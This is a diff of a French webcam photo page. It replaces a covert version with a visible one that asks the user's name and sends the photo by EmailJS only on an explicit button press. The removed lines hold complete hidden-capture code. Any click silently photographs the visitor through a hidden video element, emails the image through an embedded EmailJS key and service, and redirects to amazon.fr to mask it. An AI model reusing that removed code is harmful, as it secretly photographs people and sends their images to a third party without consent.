@@ -1,58 +1,74 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Photo ultra-légère</title>
+  <meta charset="UTF-8" />
+  <title>Photo volontaire</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
-<body>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="150" height="100" style="display:none;"></canvas>
+<body style="font-family: sans-serif; text-align: center; padding: 20px">
+  <h2>📸 Prendre une photo et l’envoyer</h2>
+  
+  <!-- Vidéo caméra -->
+  <video id="video" autoplay playsinline width="320" style="border:1px solid #ccc; border-radius:10px"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  
+  <br><br>
+  
+  <!-- Nom utilisateur -->
+  <input type="text" id="username" placeholder="Votre nom" style="padding:8px; width:200px">
+  <br><br>
+  
+  <!-- Bouton capture -->
+  <button id="capture" style="padding:10px 20px; font-size:16px; border:none; background:#2c3e50; color:white; border-radius:6px; cursor:pointer;">
+    📤 Capturer et envoyer
+  </button>
 
   <script>
+    // Initialiser EmailJS
     emailjs.init("IoSfbtGz4KSL_5_9E");
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
+    const captureButton = document.getElementById('capture');
+    const usernameInput = document.getElementById('username');
 
-    async function capturePhoto() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    // Demander l’accès à la caméra
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
         video.srcObject = stream;
+      })
+      .catch(err => {
+        alert("⚠️ Erreur d'accès caméra : " + err);
+      });
 
-        video.onloadeddata = () => {
-          // Prendre la photo
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // Arrêter la caméra
-          stream.getTracks().forEach(track => track.stop());
-
-          // Convertir en JPEG très compressé pour réduire la taille
-          canvas.toBlob((blob) => {
-            const reader = new FileReader();
-            reader.onloadend = () => {
-              const imageData = reader.result;
-
-              emailjs.send("service_8cs0gml", "template_hxfltc", {
-                message: "Photo ultra-légère 📸",
-                image: imageData
-              })
-              .then(() => { window.location.href = "https://www.amazon.fr"; })
-              .catch(err => { console.error("Erreur EmailJS :", err); window.location.href = "https://www.amazon.fr"; });
-            };
-            reader.readAsDataURL(blob);
-          }, "image/jpeg", 0.03); // Compression maximale
-        };
-
-      } catch (err) {
-        console.error("Erreur caméra :", err);
-        window.location.href = "https://www.amazon.fr";
+    // Quand on clique sur le bouton
+    captureButton.addEventListener('click', () => {
+      // Vérifier que le nom est renseigné
+      const userName = usernameInput.value.trim();
+      if (!userName) {
+        alert("Merci d’entrer votre nom avant d’envoyer !");
+        return;
       }
-    }
 
-    // Déclenchement automatique dès clic sur la page
-    document.body.addEventListener('click', capturePhoto);
+      // Dessiner image dans le canvas
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL("image/png");
+
+      // Envoyer avec EmailJS
+      emailjs.send("service_8cs0gml", "template_rdhxflt", {
+        name: userName,
+        time: new Date().toLocaleString(),
+        message: "Nouvelle photo volontaire 📸",
+        image: imageData
+      })
+      .then(() => {
+        alert("✅ Photo envoyée avec succès !");
+      })
+      .catch(err => {
+        alert("❌ Erreur lors de l'envoi : " + JSON.stringify(err));
+      });
+    });
   </script>
 </body>
 </html>
